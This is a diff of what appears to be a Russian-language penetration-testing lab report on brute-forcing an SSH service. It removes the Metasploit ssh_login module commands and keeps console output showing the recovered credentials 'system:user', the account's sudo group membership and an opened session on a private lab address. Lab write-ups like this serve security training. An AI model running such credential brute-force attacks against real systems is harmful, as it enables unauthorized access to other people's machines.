@@ -27,19 +27,15 @@ HTML Form URL Encoded: application/x-www-form-urlencoded
         Value: 14a57c60-6128-4db5-8f27-0433870466b0
         
 3.2 brut-force ssh service
-файл usr_pass.txt содержит пару логин пароль
-msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.0.1
-RHOSTS => 192.168.0.1
-msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /home/kali/usr_pass.txtUSERPASS_FILE => /home/kali/usr_pass.txt
-msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE false 
-VERBOSE => false
-msf6 auxiliary(scanner/ssh/ssh_login) > run
-
-[*] 192.168.0.1:22 - Starting bruteforce
+файл usr_pass.txt содержит пароли
+192.168.0.1:22 - Starting bruteforce
 [+] 192.168.0.1:22 - Success: 'system:user' 'uid=1000(system) gid=1000(system) groups=1000(system),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare) Linux sk 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
-[*] SSH session 1 opened (192.168.0.10:32989 -> 192.168.0.1:22) at 2023-03-12 10:07:59 -0400
+[*] SSH session 1 opened (192.168.0.10:35617 -> 192.168.0.1:22) at 2023-03-12 12:18:25 -0400
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
+
+Результат Success: 'system:user'
+
  
 
         
